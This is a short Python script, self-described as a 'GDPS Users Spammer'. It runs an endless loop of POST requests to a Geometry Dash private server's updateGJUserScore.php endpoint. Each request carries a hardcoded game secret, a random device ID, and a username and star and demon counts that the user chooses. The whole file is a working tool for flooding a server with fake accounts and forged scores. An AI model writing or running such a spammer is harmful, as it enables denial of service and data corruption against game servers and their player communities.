import requests
from random import randint as rand

def createUser(userName, stars, demons, udid):
    endpoint = database
    data = {
        'userName': userName, 
        'secret': 'Wmfv3899gc9', 
        'stars': stars, 
        'demons': demons, 
        'icon': 0, 
        'color1': 0, 
        'color2': 3,
        'udid' : udid
    }
    headers = {'User-Agent': ''}
    r = requests.post(endpoint+"updateGJUserScore.php", data=data, headers=headers)
    return r.text
def generateUDID():
    udid = "S"+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(111111111, 999999999))+str(rand(1,9))
    return udid
    
print("Sample's GDPS Users Spammer") 
database = input("database url (for example: http://ps.fhgdps.com/Geometrykras/): ")
userName = input("custom username: ")
stars = input("custom number of stars: ")
demons = input("custom number of demons: ")

while True:
    print(createUser(userName, stars, demons, generateUDID()))
    
